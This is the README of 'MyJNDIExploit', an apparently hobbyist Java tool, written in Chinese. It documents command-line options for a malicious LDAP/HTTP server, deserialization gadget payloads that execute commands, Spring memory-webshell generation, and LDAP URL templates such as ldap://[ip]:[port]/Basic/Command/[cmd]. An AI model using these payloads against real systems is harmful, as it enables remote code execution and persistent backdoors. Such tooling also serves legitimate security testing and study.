# MyJNDIExploit

# 前言

我是第一次开发工具，所以这里的逻辑会很混乱，而且有很多核心代码都是参考其他工具。我写这个工具的主要原因是，练习一下二开，另外也让自己对工具开发有个基本了解，毕竟以前几乎没写过代码。



# 功能简介

-h 打印帮助：

you must choose one param within '-i, -g, -sp'

Usage: java -jar MyJNDIExploit-xxx-xxx.jar [options]
Options:

-p, --httpport    your http port (default: 2345)

-l, --ldapport    your ladp port (default: 1389)

-i, --ip          your listen ip

-g, --gadget      choose gadget name

-c, --cmd         cmd you want to execute (default: calc)

-e, --encode      choose encode pattern | support: bin,base64,base64url,hex (default: bin)

-k, --key         key of memshell like ?cmd= (default: cmd)

-m, --memshell    generate memshell

-sp, --springboot start a vul springboot for test (default: false)

-h, --help        show helps

-u, --usage       show available gadgets (default: false)

-f, classfile     choose .class as byte[] in TemplatesImpl

在ldap服务器功能下：

- -i 指定ldap服务器ip
- -l 指定ldap服务器端口
- -p 指定http服务器端口

在生成序列化数据功能下：

- -g 指定需要使用的gadget
- -f 指定TemplatesImpl中使用的bytes对应的.class文件
- -c 指定需要执行的命令
- -e 指定需要使用的编码方式
- -m 指定需要生成的内存马种类
- -k 指定生成内存马的密码，即url中的参数，如/shell?cmd=calc，这里cmd就是密码

自带漏洞环境功能如下：
- -sp 开启一个springboot环境，/deser?ser=[base64]  用于进行原生反序列化
                        						  /lookup?url=[ldap url]     用于测试JNDI  

目前支持的Gadget和MemShell可以通过-u参数查看：



Supported Gadgets:

​     CommonsBeanutils1

Supported Memshells:

​     SpringEcho

​     SpringInterceptor

Supported LADP Queries：
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://[ip]:[ldapport]/Basic/[PayloadType]/[Params], e.g.

ldap://[ip]:[ldapport]/Basic/Command/[cmd]

ldap://[ip]:[ldapport]/Basic/Command/Base64/[base64_encoded_cmd]

ldap://[ip]:[ldapport]/Basic/SpringEcho/[key]

ldap://[ip]:[ldapport]/Basic/SpringInterceptorShell/[key]




TODO:
- 补充各种gadget（鸽）
- 制作GUI（鸽鸽）
- 制作WebServer（鸽鸽鸽）




















# 参考

[0x727/JNDIExploit: 一款用于JNDI注入利用的工具，大量参考/引用了Rogue JNDI项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。](https://github.com/0x727/JNDIExploit)

[frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)

[新年快乐 | ysoserial 分析与魔改](https://mp.weixin.qq.com/s?__biz=MzkwMzQyMTg5OA==&mid=2247486647&idx=1&sn=2e2ce3bad829dacd4807cbdb88e4ba2f&chksm=c097c612f7e04f0411454885e3d3248607f32ab6722592cc005eb610973220e8156999e75751&scene=178&cur_album_id=3744968375202660352&search_click_id=#rd)